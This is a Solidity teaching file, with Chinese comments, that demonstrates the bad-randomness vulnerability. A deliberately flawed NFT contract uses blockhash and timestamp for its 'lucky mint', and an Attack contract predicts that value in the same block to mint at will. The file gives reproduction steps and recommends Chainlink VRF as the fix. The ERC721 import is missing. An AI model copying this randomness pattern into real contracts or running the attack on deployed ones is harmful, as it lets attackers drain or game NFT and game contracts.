// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


/*
	伪随机数
	很多以太坊上的应用都需要用到随机数, 例如NFT随机抽取tokenId、抽盲盒、
	gamefi战斗中随机分胜负等等; 但是由于以太坊上所有数据都是公开透明(public)
	且确定性(deterministic)的, 没有其他编程语言一样给开发者提供生成随机数
	的方法, 例如random(); 很多项目方不得不使用链上的伪随机数生成方法, 
	例如 blockhash() 和 keccak256() 方法

	坏随机数漏洞:
	攻击者可以事先计算这些伪随机数的结果, 从而达到他们想要的目的, 例如铸造
	任何他们想要的稀有NFT而非随机抽取


	Remix 复现:
	由于 Remix 自带的 Remix VM不支持 blockhash函数, 因此需要将合约部署到以
	太坊测试链上进行复现(TODO: remix 连接以太坊测试链)

	1. 部署 BadRandomness 合约
	2. 部署 Attack 合约
	3. 将 BadRandomness 合约地址作为参数传入到 Attack 合约的 attackMint() 
		函数并调用, 完成攻击
	4. 调用 BadRandomness 合约的 balanceOf 查看Attack 合约NFT余额, 确认攻击成功

	预防:
	使用预言机项目提供的链下随机数来预防这类漏洞, 例如 Chainlink VRF; 这类随
	机数从链下生成, 然后上传到链上, 从而保证随机数不可预测
*/

contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数, 初始化NFT合集的名称、代号
    constructor() ERC721("", ""){}

    // 铸造函数: 当输入的 luckyNumber 等于随机数时才能mint
	// 用户调用时输入一个 0-99 的数字, 如果和链上生成的伪随机数 randomNumber 
	// 相等, 即可铸造幸运 NFT; 伪随机数使用 blockhash 和 block.timestamp 声明,
	// 这个漏洞在于用户可以完美预测生成的随机数并铸造NFT
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}


contract Attack {
	// 由于attackMint()和luckyMint()将在同一个区块中调用,  (TODO:? )
	// blockhash和block.timestamp是相同的, 利用他们生成的随机数也相同
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}
